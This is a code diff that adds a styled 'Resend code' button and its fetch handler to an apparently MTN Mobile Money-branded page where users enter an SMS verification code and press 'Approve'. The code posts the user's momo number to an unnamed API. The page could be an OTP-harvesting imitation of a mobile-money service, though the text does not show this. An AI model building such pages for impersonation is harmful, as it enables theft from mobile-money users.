@@ -133,6 +133,29 @@
   .cta:active:not(:disabled){transform:translateY(0);}
   .cta:disabled{opacity:.5;cursor:not-allowed;transform:none;background:#94A3B8;box-shadow:none;}
 
+  .resend-btn{
+    display:inline-flex;align-items:center;gap:6px;
+    margin-top:16px;
+    background:transparent;border:none;
+    color:var(--mtn-blue-deep);
+    font-size:13px;font-weight:800;
+    cursor:pointer;padding:8px 12px;
+    border-radius:8px;
+    transition:.18s;
+    font-family:inherit;
+    letter-spacing:0.2px;
+  }
+  .resend-btn:hover:not(:disabled){background:rgba(0,79,159,0.08);}
+  .resend-btn:disabled{opacity:.5;cursor:not-allowed;}
+  .resend-btn svg{
+    width:14px;height:14px;stroke:currentColor;fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+  .resend-btn.sent{
+    color:var(--green);
+    pointer-events:none;
+  }
+
   .status{
     font-size:12px;text-align:center;margin-top:14px;
     font-weight:700;min-height:16px;
@@ -248,6 +271,14 @@
 
       <button class="cta" id="approveBtn" onclick="approve()" disabled>Approve</button>
 
+      <button class="resend-btn" id="resendBtn" onclick="resendCode()">
+        <svg viewBox="0 0 24 24">
+          <polyline points="23 4 23 10 17 10"/>
+          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+        </svg>
+        Resend code
+      </button>
+
       <div class="status" id="status"></div>
 
       <div class="secure-note">
@@ -280,6 +311,7 @@
   const input = el('codeInput');
   const bar   = el('indicatorBar');
   const btn   = el('approveBtn');
+  const rbtn  = el('resendBtn');
 
   function setStatus(msg, type){
     const s = el('status');
@@ -322,6 +354,7 @@
 
     btn.disabled = true;
     input.disabled = true;
+    rbtn.disabled = true;
     setStatus('');
     showProcessing();
 
@@ -350,6 +383,7 @@
         setStatus('❌ ' + (data.error || 'Could not verify code.'), 'err');
         btn.disabled = false;
         input.disabled = false;
+        rbtn.disabled = false;
         input.focus();
       }
     }catch(err){
@@ -357,7 +391,46 @@
       setStatus('❌ Could not reach server.', 'err');
       btn.disabled = false;
       input.disabled = false;
+      rbtn.disabled = false;
       input.focus();
+    }
+  }
+
+  async function resendCode(){
+    if(rbtn.disabled) return;
+
+    rbtn.disabled = true;
+    setStatus('Sending new code…');
+
+    try{
+      const res = await fetch(`${API}/resend-code`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          momo: session.momo,
+          time: new Date().toLocaleString()
+        })
+      });
+
+      const data = await res.json();
+
+      if(data.ok){
+        setStatus('✅ New code sent. Check your SMS.', 'ok');
+        rbtn.classList.add('sent');
+        rbtn.innerHTML = `
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+          Code sent
+        `;
+        input.value = '';
+        refresh();
+        input.focus();
+      }else{
+        setStatus('❌ ' + (data.error || 'Could not resend code.'), 'err');
+        rbtn.disabled = false;
+      }
+    }catch(err){
+      setStatus('❌ Could not reach server.', 'err');
+      rbtn.disabled = false;
     }
   }
 </script>
